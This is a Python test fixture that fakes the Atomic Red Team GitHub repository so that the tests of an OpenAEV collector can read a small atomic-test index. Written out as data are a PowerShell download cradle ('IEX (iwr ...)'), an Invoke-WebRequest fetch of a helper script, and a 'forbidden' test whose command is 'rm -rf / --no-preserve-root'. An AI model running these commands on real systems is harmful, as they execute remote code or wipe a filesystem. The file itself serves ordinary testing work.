"""Atomic Red Team (github.com/redcanaryco/atomic-red-team), read by the OpenAEV
atomic-red-team collector: ``atomics/Indexes/index.yaml`` (every atomic test, by
tactic and technique) and the files atomic tests download from ``atomics/``.

The repository is served by the GitHub fake (``GITHUB_REPOS``):
raw.githubusercontent.com and github.com/.../raw/ answer it. The index keeps the shape
of the real one (the technique's STIX object, then its ``atomic_tests`` with
``auto_generated_guid``, ``supported_platforms``, ``input_arguments``, ``dependencies``
and ``executor``) and what the collector acts on:

* a Linux/macOS ``sh`` test with input arguments and a cleanup command;
* a Windows PowerShell test with dependencies whose commands use ``PathToAtomicsFolder``
  (the collector turns those into arguments and download prerequisites);
* a ``command_prompt`` test running an ``ExternalPayloads`` binary, elevation required;
* a ``manual`` test (no command: not a payload);
* a test the collector ignores (copied to the OpenAEV payloads repository) and one it
  forbids (destructive), by their real GUIDs.

Names and descriptions come from a seeded Faker (with the CTI providers), so the
dataset is the same run after run.
"""

import uuid

import yaml
from faker import Faker
from faker_cti import CtiProvider

from app.vendors.github import Repo

_faker = Faker()
_faker.add_provider(CtiProvider)
_faker.seed_instance(9090)

# GUIDs the collector skips: one of IGNORED_PAYLOADS, the FORBIDDEN_PAYLOADS one
IGNORED_GUID = "aa6cb8c4-b582-4f8e-b677-37733914abda"
FORBIDDEN_GUID = "f3aa95fe-4f10-4485-ad26-abf22a764c52"


def _guid() -> str:
    return str(uuid.UUID(int=_faker.random.getrandbits(128), version=4))


def _technique(external_id: str, name: str, tactic: str) -> dict:
    return {
        "type": "attack-pattern",
        "id": f"attack-pattern--{_guid()}",
        "name": name,
        "external_references": [
            {
                "source_name": "mitre-attack",
                "external_id": external_id,
                "url": "https://attack.mitre.org/techniques/"
                + external_id.replace(".", "/"),
            }
        ],
        "kill_chain_phases": [
            {"kill_chain_name": "mitre-attack", "phase_name": tactic}
        ],
        "x_mitre_platforms": ["Linux", "macOS", "Windows"],
        "x_mitre_version": "1.2",
    }


def _description() -> str:
    return _faker.paragraph(nb_sentences=2)


SH_TEST = {
    "name": f"Delete {_faker.file_name(extension='log')} with rm",
    "auto_generated_guid": _guid(),
    "description": _description(),
    "supported_platforms": ["linux", "macos"],
    "input_arguments": {
        "file_to_delete": {
            "description": "Path of the file to delete",
            "type": "path",
            "default": "/tmp/victim-files/T1070.004-test.txt",
        }
    },
    "executor": {
        "name": "sh",
        "elevation_required": False,
        "command": 'mkdir -p /tmp/victim-files && touch "#{file_to_delete}"\n'
        'rm -f "#{file_to_delete}"\n',
        "cleanup_command": "rm -rf /tmp/victim-files",
    },
}
POWERSHELL_TEST = {
    "name": f"Invoke {_faker.word().title()} PowerShell download cradle",
    "auto_generated_guid": _guid(),
    "description": _description(),
    "supported_platforms": ["windows"],
    "input_arguments": {
        "script_url": {
            "description": "URL of the script to run",
            "type": "url",
            "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/"
            "master/atomics/T1059.001/src/test.ps1",
        }
    },
    "dependency_executor_name": "powershell",
    "dependencies": [
        {
            "description": "The helper script must exist on disk",
            "prereq_command": "if (Test-Path PathToAtomicsFolder\\T1059.001\\src\\"
            "helper.ps1) {exit 0} else {exit 1}",
            "get_prereq_command": "New-Item -Type Directory "
            "PathToAtomicsFolder\\..\\ExternalPayloads -ErrorAction ignore | Out-Null\n"
            "Invoke-WebRequest https://example.org/helper.ps1 -OutFile "
            "PathToAtomicsFolder\\T1059.001\\src\\helper.ps1",
        }
    ],
    "executor": {
        "name": "powershell",
        "elevation_required": False,
        "command": "powershell.exe -ExecutionPolicy Bypass -File "
        "PathToAtomicsFolder\\T1059.001\\src\\helper.ps1\n"
        "IEX (iwr '#{script_url}' -UseBasicParsing)",
    },
}
CMD_TEST = {
    "name": "Discover the system with an ExternalPayloads tool",
    "auto_generated_guid": _guid(),
    "description": _description(),
    "supported_platforms": ["windows"],
    "input_arguments": {
        "tool_path": {
            "description": "Path of the discovery tool",
            "type": "path",
            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sysinfo.exe",
        }
    },
    "executor": {
        "name": "command_prompt",
        "elevation_required": True,
        "command": '"#{tool_path}" /all\nsysteminfo\n',
    },
}
MANUAL_TEST = {
    "name": "Review scheduled tasks by hand",
    "auto_generated_guid": _guid(),
    "description": _description(),
    "supported_platforms": ["windows"],
    "executor": {"name": "manual", "steps": "1. Open the Task Scheduler\n2. Review\n"},
}
IGNORED_TEST = {
    **SH_TEST,
    "name": "Already in the OpenAEV payloads repository",
    "auto_generated_guid": IGNORED_GUID,
}
FORBIDDEN_TEST = {
    **SH_TEST,
    "name": "Delete Filesystem - Linux",
    "auto_generated_guid": FORBIDDEN_GUID,
    "executor": {"name": "bash", "command": "rm -rf / --no-preserve-root"},
}

INDEX = {
    "defense-evasion": {
        "T1070.004": {
            "technique": _technique("T1070.004", "File Deletion", "defense-evasion"),
            "atomic_tests": [SH_TEST, IGNORED_TEST, FORBIDDEN_TEST],
        }
    },
    "execution": {
        "T1059.001": {
            "technique": _technique("T1059.001", "PowerShell", "execution"),
            "atomic_tests": [POWERSHELL_TEST],
        }
    },
    "discovery": {
        "T1082": {
            "technique": _technique(
                "T1082", "System Information Discovery", "discovery"
            ),
            "atomic_tests": [CMD_TEST, MANUAL_TEST],
        }
    },
}


def _repo() -> Repo:
    return Repo(
        files={
            "atomics/Indexes/index.yaml": yaml.safe_dump(
                INDEX, sort_keys=False
            ).encode(),
            "atomics/T1059.001/src/helper.ps1": b"Write-Host 'atomic helper'\n",
        },
        branch="master",
        description="Small and highly portable detection tests based on ATT&CK.",
    )


GITHUB_REPOS = {"redcanaryco/atomic-red-team": _repo}
